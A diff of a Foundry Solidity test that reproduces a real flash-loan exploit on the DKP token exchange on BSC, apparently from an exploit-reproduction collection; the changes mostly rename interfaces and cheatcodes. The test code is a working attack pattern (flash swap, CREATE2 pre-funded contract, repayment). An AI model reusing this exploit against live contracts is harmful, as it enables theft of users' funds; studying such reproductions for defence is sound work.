@@ -2,7 +2,6 @@
 pragma solidity ^0.8.10;
 
 import "forge-std/Test.sol";
-import "./../interface.sol";
 
 // @Analysis
 // https://twitter.com/CertiKAlert/status/1633421908996763648
@@ -24,19 +23,17 @@ contract ContractTest is Test {
 
     IERC20 DKP = IERC20(0xd06fa1BA7c80F8e113c2dc669A23A9524775cF19);
     IERC20 USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
-    Uni_Pair_V2 Pair = Uni_Pair_V2(0xBE654FA75bAD4Fd82D3611391fDa6628bB000CC7);
-    Uni_Router_V2 Router = Uni_Router_V2(0x10ED43C718714eb63d5aA57B78B54704E256024E);
+    IUniswapV2Pair Pair = IUniswapV2Pair(0xBE654FA75bAD4Fd82D3611391fDa6628bB000CC7);
+    IUniswapV2Router Router = IUniswapV2Router(0x10ED43C718714eb63d5aA57B78B54704E256024E);
     IDKPExchange DKPExchange = IDKPExchange(0x89257A52Ad585Aacb1137fCc8abbD03a963B9683);
 
-    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
-
     function setUp() public {
-        cheats.createSelectFork("bsc", 26_284_131);
-        cheats.label(address(DKP), "DKP");
-        cheats.label(address(USDT), "USDT");
-        cheats.label(address(Pair), "Pair");
-        cheats.label(address(Router), "Router");
-        cheats.label(address(DKPExchange), "DKPExchange");
+        vm.createSelectFork("bsc", 26_284_131);
+        vm.label(address(DKP), "DKP");
+        vm.label(address(USDT), "USDT");
+        vm.label(address(Pair), "Pair");
+        vm.label(address(Router), "Router");
+        vm.label(address(DKPExchange), "DKPExchange");
     }
 
     function testExploit() public {
@@ -50,7 +47,7 @@ contract ContractTest is Test {
     }
 
     function exchangeDKP() internal {
-        uint256 flashAmount = USDT.balanceOf(address(Pair)) * 9992 / 10_000;
+        uint256 flashAmount = (USDT.balanceOf(address(Pair)) * 9992) / 10_000;
         Pair.swap(flashAmount, 0, address(this), abi.encode(flashAmount));
     }
 
@@ -60,7 +57,7 @@ contract ContractTest is Test {
         address receiver = getAddress(contractByteCode, salt);
         USDT.transfer(receiver, 100 * 1e18);
         new ExchangeDKP{salt: keccak256("salt")}();
-        uint256 returnAmount = abi.decode(data, (uint256)) * 10_000 / 9975 + 1000;
+        uint256 returnAmount = (abi.decode(data, (uint256)) * 10_000) / 9975 + 1000;
         USDT.transfer(address(Pair), returnAmount);
     }
 
